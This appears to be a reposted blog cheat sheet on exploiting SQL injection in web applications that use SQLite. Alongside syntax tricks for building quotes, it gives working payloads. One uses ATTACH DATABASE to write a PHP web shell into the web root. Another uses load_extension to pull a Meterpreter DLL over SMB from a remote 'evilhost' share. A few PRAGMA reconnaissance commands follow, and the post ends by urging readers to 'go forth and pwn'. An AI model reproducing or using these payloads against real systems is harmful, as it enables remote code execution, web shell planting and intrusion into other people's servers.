title: "SQLite3 Injection Cheat Sheet"
date: 2013-06-17 23:08:46
tags:
id: 267
comment: false
categories:
  - 默认分类
---

**Introduction**
<div></div>
<div>A few months ago I found an SQL injection vulnerability in an enterprisey webapp's help system. Turns out this was stored in a separate database - in SQLite. I had a Google around and could find very little information about exploiting SQLI with SQLite as the backend.. so I went on a hunt, and found some neat tricks. This is almost entirely applicable only to webapps using SQLite - other implementations (in Adobe, Android, Firefox etc) largely don't support the tricks below.</div>
<div></div>
<div></div>
<div>**Cheat Sheet**</div>
<div></div>
<div>
<table border="1" cellspacing="0">
<tbody>
<tr>
<td> Comments</td>
<td> --</td>
</tr>
<tr>
<td> IF Statements</td>
<td> CASE</td>
</tr>
<tr>
<td> Concatenation</td>
<td> ||</td>
</tr>
<tr>
<td> Substring</td>
<td> substr(x,y,z)</td>
</tr>
<tr>
<td> Length</td>
<td> length(stuff)</td>
</tr>
<tr>
<td> Generate single quote</td>
<td> select substr(quote(hex(0)),1,1);</td>
</tr>
<tr>
<td> Generate double quote</td>
<td> select cast(X'22' as text);</td>
</tr>
<tr>
<td> Generate double quote (method 2)</td>
<td> .. VALUES (“&lt;?xml version=“||””””||1||</td>
</tr>
<tr>
<td> Space-saving double quote generation</td>
<td> select replace("&lt;?xml version=$1.0$&gt;","$",(select cast(X'22' as text)));</td>
</tr>
</tbody>
</table>
</div>
<div>For some reason, 4x double quotes turns into a single double quote. Quirky, but it works.</div>
<div></div>
<div></div>
<div>**Getting Shell Trick 1 - ATTACH DATABASE**</div>
<div></div>
<div>
<div>What it says on the tin - lets you attach another database for your querying pleasure. Attach another known db on the filesystem that contains interesting stuff - e.g. a configuration database. Better yet - if the designated file doesn't exist, it will be created. You can create this file anywhere on the filesystem that you have write access to. PHP example:</div>
</div>
<div></div>
<div>**?id=bob’; ATTACH DATABASE ‘<span style="color: #ff0000;">/var/www/lol.php</span>’ AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES (‘<span style="color: #ff0000;">&lt;? system($_GET[‘cmd’]); ?&gt;</span>’;--**</div>
<div></div>
<div>Then of course you can just visit lol.php?cmd=id and enjoy code exec! This requires stacked queries to be a goer.</div>
<div></div>
<div></div>
<div>**Getting Shell Trick 2 - SELECT load_extension**</div>
<div></div>
<div>
<div>Takes two arguments:</div>
<div>

*   A library (.dll for Windows, .so for NIX)
*   An entry point (SQLITE_EXTENSION_INIT1 by default)
This is great because</div>
<div>

1.  This technique doesn't require stacked queries
2.  The obvious - you can load a DLL right off the bat (meterpreter.dll? :)
</div>
</div>
<div>Unfortunately, this component of SQLite is disabled in the libraries by default. SQLite devs saw the exploitability of this and turned it off. However, some custom libraries have it enabled - for example, one of the more popular Windows ODBC drivers. To make this even better, this particular injection works with UNC paths - so you can remotely load a nasty library over SMB (provided the target server can speak SMB to the Internets). Example:</div>
<div></div>
<div>**?name=123 UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--**</div>
<div></div>
<div>This works wonderfully :)</div>
<div></div>
<div></div>
<div>**Other neat bits**</div>
<div></div>
<div>If you have direct DB access, you can use **PRAGMA** commands to find out interesting information:</div>
<div>

*   **PRAGMA database_list; **-- Shows info on the attached databases, including location on the FS. e.g. **0|main|/home/vt/haxing/sqlite/how.db**
*   **PRAGMA temp_store_directory = '/filepath'; **-- Supposedly sets directory for temp files, but deprecated. This would’ve been pretty sweet with the recent Android journal file permissions bug.
</div>
<div></div>
<div>**Conclusion / Closing Remarks**</div>
<div></div>
<div>SQLite is used in all sorts of crazy places, including Airbus, Adobe, Solaris, browsers, extensively on mobile platforms, etc. There is a lot of potential for further research in these areas (especially mobile) so go forth and pwn!</div>
<div></div>
<div></div>
<div>[https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet](https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet)</div>